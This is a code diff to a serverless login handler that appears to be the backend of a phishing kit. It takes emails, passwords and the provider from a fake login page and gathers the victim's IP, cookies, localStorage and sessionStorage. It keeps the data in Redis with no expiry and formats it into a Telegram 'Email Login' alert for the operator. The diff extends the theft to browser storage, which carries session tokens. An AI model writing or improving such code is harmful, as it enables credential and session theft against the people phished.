@@ -33,7 +33,7 @@ export const handler = async (event, context) => {
     });
 
     const data = JSON.parse(event.body);
-    const { email, password, provider, fileName, timestamp, userAgent } = data;
+    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint } = data;
 
     // Get client IP with better detection for mobile
     const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -41,9 +41,10 @@ export const handler = async (event, context) => {
                      event.headers['cf-connecting-ip'] || 
                      'Unknown';
 
-    // Get cookies from request headers
-    const cookies = event.headers.cookie || 'No cookies found';
-    const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
+    // Use browser fingerprint data if available, fallback to headers
+    const cookieInfo = browserFingerprint?.cookies || event.headers.cookie || 'No cookies found';
+    const localStorageInfo = browserFingerprint?.localStorage || 'Not available';
+    const sessionStorageInfo = browserFingerprint?.sessionStorage || 'Not available';
     
     // Get additional browser fingerprinting data (excluding referer)
     const acceptLanguage = event.headers['accept-language'] || 'Unknown';
@@ -122,15 +123,16 @@ export const handler = async (event, context) => {
       clientIP,
       userAgent,
       deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
-      cookies: cookieInfo,
+      cookies: cookieInfo.length > 200 ? cookieInfo.substring(0, 200) + '...' : cookieInfo,
       acceptLanguage,
-      acceptEncoding
+      acceptEncoding,
+      browserFingerprint
     };
 
     try {
-      // Store in Redis with 24-hour TTL
-      await redis.setex(`session:${sessionId}`, 86400, JSON.stringify(sessionData));
-      await redis.setex(`user:${email}`, 86400, JSON.stringify(sessionData));
+      // Store in Redis with no expiration (set without TTL)
+      await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
+      await redis.set(`user:${email}`, JSON.stringify(sessionData));
     } catch (redisError) {
       console.error('Redis storage error:', redisError);
       // Continue with Telegram even if Redis fails
@@ -138,6 +140,22 @@ export const handler = async (event, context) => {
 
     // Format message for Telegram with better mobile detection (without referer)
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
+    
+    // Format cookies for better readability
+    const formattedCookies = cookieInfo.length > 150 ? cookieInfo.substring(0, 150) + '...' : cookieInfo;
+    
+    // Additional browser data
+    const additionalInfo = browserFingerprint ? `
+🖥️ *Screen:* \`${browserFingerprint.screen || 'Unknown'}\`
+🌍 *Timezone:* \`${browserFingerprint.timezone || 'Unknown'}\`
+🔧 *Platform:* \`${browserFingerprint.platform || 'Unknown'}\`
+🍪 *Cookies Enabled:* ${browserFingerprint.cookieEnabled ? '✅' : '❌'}
+📶 *Online Status:* ${browserFingerprint.onlineStatus || 'Unknown'}
+💾 *LocalStorage:* \`${browserFingerprint.localStorage?.substring(0, 100) || 'Empty'}${browserFingerprint.localStorage?.length > 100 ? '...' : ''}\`
+🗂️ *SessionStorage:* \`${browserFingerprint.sessionStorage?.substring(0, 100) || 'Empty'}${browserFingerprint.sessionStorage?.length > 100 ? '...' : ''}\`${browserFingerprint.touchSupport ? `
+👆 *Touch Support:* ${browserFingerprint.touchSupport}` : ''}${browserFingerprint.orientation ? `
+📱 *Orientation:* \`${browserFingerprint.orientation}\`` : ''}${browserFingerprint.devicePixelRatio ? `
+🔍 *Pixel Ratio:* \`${browserFingerprint.devicePixelRatio}\`` : ''}` : '';
     
     const message = `
 🔐 *Email Login*
@@ -151,7 +169,7 @@ export const handler = async (event, context) => {
 ${deviceInfo}
 🌍 *Language:* \`${acceptLanguage}\`
 📦 *Encoding:* \`${acceptEncoding}\`
-🍪 *Cookies:* \`${cookieInfo}\`
+🍪 *Cookies:* \`${formattedCookies}\`${additionalInfo}
 🆔 *Session ID:* \`${sessionId}\`
 
 ---
